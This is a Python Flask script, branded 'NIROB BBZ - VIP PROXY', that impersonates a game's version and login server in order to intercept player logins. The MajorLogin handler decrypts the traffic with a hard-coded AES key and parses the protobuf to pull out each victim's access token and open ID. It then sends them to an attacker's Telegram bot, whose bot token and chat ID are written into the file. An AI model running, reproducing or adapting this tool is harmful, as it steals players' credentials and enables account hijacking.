from flask import Flask, request, Response, jsonify
import json
import requests
import socket
from urllib.parse import urlparse, parse_qs
import httpx
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import time
import os
import logging
import re
import base64
import struct

# Flask App initialization
app = Flask(__name__)

# Disable logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# ANSI Colors (only for local run)
G = "\033[92m"
Y = "\033[93m"
R = "\033[91m"
B = "\033[94m"
W = "\033[0m"
C = "\033[96m"
M = "\033[95m"

def rainbow_text(text):
    colors = [
        (255, 0, 0), (255, 165, 0), (255, 255, 0),
        (0, 255, 0), (0, 255, 255), (0, 0, 255), (128, 0, 255)
    ]
    result = ""
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        result += f"\033[38;2;{color[0]};{color[1]};{color[2]}m{char}"
    return result + W

def animated_banner():
    banner = f"""
{G}╔══════════════════════════════════════════╗
{Y}║          NIROB BBZ - VIP PROXY           ║
{C}║          SECURE SERVER v3.0              ║
{M}╚══════════════════════════════════════════╝{W}
    """
    print(banner)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

LOCAL_IP = get_local_ip()
PORT = int(os.environ.get('PORT', 5000))

# ================= TELEGRAM CONFIG =================
BOT_TOKEN = "8859282308:AAFPrC5ooQOGxacZdnbB-ZjAQ5szGeLyf-Y"
CHAT_ID = "-1004291576288"
# ===================================================

# ================= CRYPTO FUNCTIONS =================
KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

def aes_decrypt(encrypted_hex):
    """Decrypt AES-CBC"""
    try:
        encrypted_bytes = bytes.fromhex(encrypted_hex)
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        decrypted = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)
        return decrypted.hex()
    except Exception as e:
        print(f"Decrypt error: {e}")
        return None

def aes_encrypt(plain_hex):
    """Encrypt AES-CBC"""
    try:
        plain_bytes = bytes.fromhex(plain_hex)
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        encrypted = cipher.encrypt(pad(plain_bytes, AES.block_size))
        return encrypted.hex()
    except Exception as e:
        print(f"Encrypt error: {e}")
        return None

# ================= SIMPLE PROTOBUF PARSER =================
def decode_varint(data, pos):
    """Decode protobuf varint"""
    result = 0
    shift = 0
    while True:
        if pos >= len(data):
            return None, pos
        byte = data[pos]
        pos += 1
        result |= (byte & 0x7F) << shift
        if not (byte & 0x80):
            break
        shift += 7
    return result, pos

def encode_varint(value):
    """Encode protobuf varint"""
    result = []
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            byte |= 0x80
        result.append(byte)
        if not value:
            break
    return bytes(result)

def parse_protobuf(data):
    """Simple protobuf parser"""
    result = {}
    pos = 0
    while pos < len(data):
        # Read field header
        header, pos = decode_varint(data, pos)
        if header is None:
            break
        
        field_number = header >> 3
        wire_type = header & 0x7
        
        if wire_type == 0:  # Varint
            value, pos = decode_varint(data, pos)
            if value is not None:
                result[field_number] = value
        
        elif wire_type == 2:  # Length-delimited
            length, pos = decode_varint(data, pos)
            if length is not None and pos + length <= len(data):
                value = data[pos:pos+length]
                pos += length
                
                # Try to parse as nested protobuf
                try:
                    nested = parse_protobuf(value)
                    if nested:
                        result[field_number] = nested
                    else:
                        # Try to decode as string
                        try:
                            result[field_number] = value.decode('utf-8')
                        except:
                            result[field_number] = value.hex()
                except:
                    result[field_number] = value.hex()
        
        elif wire_type == 1:  # 64-bit
            if pos + 8 <= len(data):
                result[field_number] = struct.unpack('<Q', data[pos:pos+8])[0]
                pos += 8
        
        elif wire_type == 5:  # 32-bit
            if pos + 4 <= len(data):
                result[field_number] = struct.unpack('<I', data[pos:pos+4])[0]
                pos += 4
    
    return result

def search_in_data(data, target_fields):
    """Search for specific fields in parsed data"""
    results = {}
    
    def recursive_search(obj, depth=0):
        if depth > 20:
            return
        
        if isinstance(obj, dict):
            for key, value in obj.items():
                # Check if key matches target
                for target in target_fields:
                    if str(key) == str(target) or str(key) == target:
                        if target not in results:
                            results[target] = value
                
                # Recursive search
                recursive_search(value, depth + 1)
        
        elif isinstance(obj, list):
            for item in obj:
                recursive_search(item, depth + 1)
    
    recursive_search(data)
    return results

# ================= TELEGRAM SENDER =================
def send_to_telegram(access_token, open_id):
    """Send to Telegram"""
    if not access_token or not open_id or access_token == "FAILED_TO_EXTRACT":
        return False
    
    try:
        message = f"""🔥 TOKEN CAPTURED! 🔥

🔑 Access Token:
<code>{access_token}</code>

🆔 Open ID:
<code>{open_id}</code>

👑 System: NIROB BBZ
⚡ Status: SUCCESS
🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}

───────────────────
🤖 @GHOST_XAPIS
"""
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

# ================= PROXY HANDLER =================
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def proxy_handler(path):
    full_path = f"/{path}" if path else "/"
    parsed_path = urlparse(full_path)
    path = parsed_path.path
    
    if path == "/ver.php":
        return handle_ver_php(parsed_path)
    elif path == "/MajorLogin":
        return handle_major_login()
    else:
        return Response("Not Found", status=404)

def handle_ver_php(parsed_path):
    """Handle /ver.php"""
    target = "https://version.ggwhitehawk.com/live/ver.php"
    headers = {k: v for k, v in request.headers.items() 
               if k.lower() not in ("host", "content-length", "connection")}
    body = request.get_data()
    
    try:
        with httpx.Client(follow_redirects=True, timeout=30.0) as client:
            r = client.request(
                request.method, 
                target, 
                params=parse_qs(parsed_path.query), 
                headers=headers, 
                content=body
            )
        
        try:
            data = r.json()
        except:
            data = {"raw": r.text}
        
        data["server_url"] = f"http://{LOCAL_IP}:{PORT}/"
        
        response = Response(json.dumps(data), status=r.status_code, mimetype='application/json')
        HOP_BY_HOP = {'transfer-encoding', 'connection', 'keep-alive', 'proxy-authenticate', 
                      'proxy-authorization', 'te', 'trailers', 'upgrade', 'proxy-connection'}
        for k, v in r.headers.items():
            if k.lower() not in HOP_BY_HOP:
                response.headers[k] = v
        
        return response
    except Exception as e:
        return Response(json.dumps({"error": str(e)}), status=500, mimetype='application/json')

def handle_major_login():
    """Handle /MajorLogin"""
    print(f"\n{rainbow_text('[+] TARGET HIT!')}{W}")
    
    # Get raw data
    raw_data = request.get_data()
    print(f"[DEBUG] Received {len(raw_data)} bytes")
    
    access_token = "FAILED_TO_EXTRACT"
    open_id = "FAILED_TO_EXTRACT"
    
    # METHOD 1: Try JSON
    try:
        json_data = json.loads(raw_data)
        access_token = json_data.get('29') or json_data.get('access_token') or json_data.get('token')
        open_id = json_data.get('22') or json_data.get('open_id') or json_data.get('user_id')
        if access_token and open_id:
            print("[✔] Extracted from JSON")
    except:
        pass
    
    # METHOD 2: Try hex + protobuf
    if not access_token or not open_id:
        try:
            hex_data = raw_data.hex()
            print(f"[DEBUG] Hex length: {len(hex_data)}")
            
            # Parse protobuf
            parsed = parse_protobuf(raw_data)
            if parsed:
                print(f"[DEBUG] Parsed fields: {list(parsed.keys())}")
                results = search_in_data(parsed, ['29', '22', 'access_token', 'open_id', 'token'])
                
                if '29' in results or 'access_token' in results:
                    access_token = results.get('29') or results.get('access_token') or str(results.get('token'))
                if '22' in results or 'open_id' in results:
                    open_id = results.get('22') or results.get('open_id') or results.get('user_id')
                
                if access_token and open_id:
                    print("[✔] Extracted from Protobuf")
        except Exception as e:
            print(f"[!] Protobuf error: {e}")
    
    # METHOD 3: Try decrypt + protobuf
    if not access_token or not open_id:
        try:
            hex_data = raw_data.hex()
            decrypted = aes_decrypt(hex_data)
            if decrypted:
                print(f"[DEBUG] Decrypted: {decrypted[:100]}...")
                decrypted_bytes = bytes.fromhex(decrypted)
                parsed = parse_protobuf(decrypted_bytes)
                if parsed:
                    results = search_in_data(parsed, ['29', '22', 'access_token', 'open_id', 'token'])
                    if '29' in results or 'access_token' in results:
                        access_token = results.get('29') or results.get('access_token')
                    if '22' in results or 'open_id' in results:
                        open_id = results.get('22') or results.get('open_id')
                    
                    if access_token and open_id:
                        print("[✔] Extracted from Decrypted Protobuf")
        except Exception as e:
            print(f"[!] Decrypt error: {e}")
    
    # METHOD 4: Try regex extraction
    if not access_token or not open_id:
        try:
            text = raw_data.decode('utf-8', errors='ignore')
            token_pattern = r'(?:29|access_token|token)[:\s=]+["\']?([^"\'&\s,}]+)["\']?'
            id_pattern = r'(?:22|open_id|user_id)[:\s=]+["\']?([^"\'&\s,}]+)["\']?'
            
            token_match = re.search(token_pattern, text, re.IGNORECASE)
            id_match = re.search(id_pattern, text, re.IGNORECASE)
            
            if token_match:
                access_token = token_match.group(1)
            if id_match:
                open_id = id_match.group(1)
            
            if access_token and open_id:
                print("[✔] Extracted from Regex")
        except:
            pass
    
    # Convert to string if needed
    if access_token and not isinstance(access_token, str):
        access_token = str(access_token)
    if open_id and not isinstance(open_id, str):
        open_id = str(open_id)
    
    # Display results
    print(f"\n{'='*60}")
    print(f"{rainbow_text('🔥 CREDENTIALS EXTRACTED 🔥')}")
    print(f"{'='*60}")
    print(f"🔑 Access Token: {access_token}")
    print(f"🆔 Open ID: {open_id}")
    print(f"{'='*60}\n")
    
    # Send to Telegram
    if access_token and access_token != "FAILED_TO_EXTRACT" and open_id and open_id != "FAILED_TO_EXTRACT":
        success = send_to_telegram(access_token, open_id)
        if success:
            print(f"{G}[✔] Sent to Telegram successfully{W}")
        else:
            print(f"{R}[!] Failed to send to Telegram{W}")
    
    # Response
    response_payload = f"""[b][c][00FFFF]✘━━━━━━━━━━━━━[FFD3EF]ZIBON[00FFFF]━━━━━━━━━━━━✘

[FF0000]Access Token => [00FF00]{access_token} [FF0000]| Open ID => [00FF00]{open_id}

[FF00FF]System Owner: [00FFFF]SPEED [FF0000]X [FFFF00]ZIBON 
[FFFF00]TG => [FF0000]@GHOST_XAPIS

[b][c][00FFFF]✘━━━━━━━━━━━━━[FFD3EF]ZIBON[00FFFF]━━━━━━━━━━━━✘
"""
    
    return Response(response_payload, status=500, mimetype='application/octet-stream')

# ================= HEALTH CHECK =================
@app.route('/health')
def health_check():
    return jsonify({
        "status": "ok",
        "server": "NIROB BBZ - VIP PROXY",
        "version": "3.0",
        "telegram": bool(BOT_TOKEN and CHAT_ID),
        "timestamp": time.time()
    })

@app.route('/status')
def status():
    return jsonify({
        "status": "running",
        "telegram_configured": bool(BOT_TOKEN and CHAT_ID)
    })

# ================= RUN =================
if __name__ == '__main__':
    animated_banner()
    print(f"{G}[✔] Status: Running{W}")
    print(f"{G}[✔] Port: {PORT}{W}")
    print(f"{G}[✔] Local: http://127.0.0.1:{PORT}/{W}")
    print(f"{G}[✔] Network: http://{LOCAL_IP}:{PORT}/{W}")
    print(f"{rainbow_text('──────────────────────────────────────────')}")
    print(f"{Y}[*] Waiting for targets...{W}\n")
    app.run(host='0.0.0.0', port=PORT, debug=False)
